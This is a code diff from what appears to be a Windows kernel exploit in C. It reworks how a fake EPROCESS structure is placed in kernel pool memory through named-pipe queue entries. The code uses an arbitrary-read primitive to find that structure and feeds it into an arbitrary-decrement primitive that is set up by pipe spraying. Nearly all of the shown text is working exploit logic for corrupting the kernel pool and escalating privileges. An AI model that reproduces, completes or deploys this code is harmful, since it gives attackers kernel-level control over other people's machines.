@@ -81,25 +81,25 @@ int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
     return 1;
 }
 
-uintptr_t allocFakeEprocessInPagedPool(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs, char* fake_eprocess_buf)
+uintptr_t allocFakeEprocess(exploit_pipes_t* pipes, exploit_addresses_t* addrs, char* fake_eprocess_buf)
 {
-    // Prepare the attribute data: name + fake EPROCESS
-    char fake_eprocess_attribute[0x1000] = { 0 };
-    memcpy(fake_eprocess_attribute + DUMB_ATTRIBUTE_NAME_LEN, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
-    strcpy_s(fake_eprocess_attribute, DUMB_ATTRIBUTE_NAME_LEN, DUMB_ATTRIBUTE_NAME);
+    // Write fake EPROCESS data to the previous chunk pipe, creating a new pipe queue entry in NonPagedPoolNx
+    WriteDataToPipe(&pipes->previous_chunk_pipe, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
 
-    // Set the attribute on the pipe, storing data in PagedPool
-    SetPipeAttribute(ghost_pipe, fake_eprocess_attribute, DUMB_ATTRIBUTE_NAME_LEN + FAKE_EPROCESS_SIZE);
+    // Calculate the address of the previous chunk's pipe_queue_entry
+    uintptr_t prev_vs_chunk_addr = addrs->ghost_vs_chunk - PREV_CHUNK_OFFSET;
+    uintptr_t prev_pipe_queue_entry_addr = prev_vs_chunk_addr + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER);
 
-    // Read the Blink of the root pipe attribute to find our new attribute
-    uintptr_t fake_eprocess_attribute_addr;
-    ArbitraryRead(ghost_pipe, addrs->root_pipe_attribute + offsetof(LIST_ENTRY, Blink), (char*)&fake_eprocess_attribute_addr, 0x8);
-    printf("[+] fake_eprocess_attribute: 0x%llx\n", fake_eprocess_attribute_addr);
+    // Get the address of the newly created pipe_queue_entry by reading the Flink of the previous entry
+    uintptr_t new_pipe_queue_entry_addr;
+    ArbitraryRead(&pipes->ghost_chunk_pipe, prev_pipe_queue_entry_addr + offsetof(LIST_ENTRY, Flink), (char*)&new_pipe_queue_entry_addr, 0x8);
 
-    // Read the AttributeValue field to get the address of our fake EPROCESS
-    uintptr_t fake_eprocess;
-    ArbitraryRead(ghost_pipe, fake_eprocess_attribute_addr + offsetof(pipe_attribute_t, AttributeValue), (char*)&fake_eprocess, 0x8);
-    return fake_eprocess + FAKE_EPROCESS_OFFSET;
+    // Calculate the start address of the data buffer in the new pipe_queue_entry
+    // The fake EPROCESS structure is located within this data buffer
+    uintptr_t pipe_queue_data_start = new_pipe_queue_entry_addr + offsetof(pipe_queue_entry_t, data);
+
+    // Return the exact address of the fake EPROCESS structure within the pipe queue data buffer
+    return pipe_queue_data_start + FAKE_EPROCESS_OFFSET;
 }
 
 int setupFakeEprocess(char* fake_eprocess_buf, uintptr_t addr_to_decrement)
@@ -137,12 +137,12 @@ void setFakeProcessBilled(exploit_pipes_t* pipes, exploit_addresses_t* addrs, ui
 
 int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t addr_to_decrement)
 {
-    puts("[*] Preparing fake EPROCESS attribute");
+    puts("[*] Preparing fake EPROCESS buffer");
     char fake_eprocess_buf[0x1000] = { 0 };
     setupFakeEprocess(fake_eprocess_buf, addr_to_decrement - 0x1);
 
     puts("[*] Allocating fake EPROCESS");
-    uintptr_t fake_eprocess = allocFakeEprocessInPagedPool(&pipes->ghost_chunk_pipe, addrs, fake_eprocess_buf);
+    uintptr_t fake_eprocess = allocFakeEprocess(pipes, addrs, fake_eprocess_buf);
     printf("[+] Fake EPROCESS address: 0x%llX\n", fake_eprocess);
 
     puts("[*] Spraying pipes with fake ProcessBilled...");
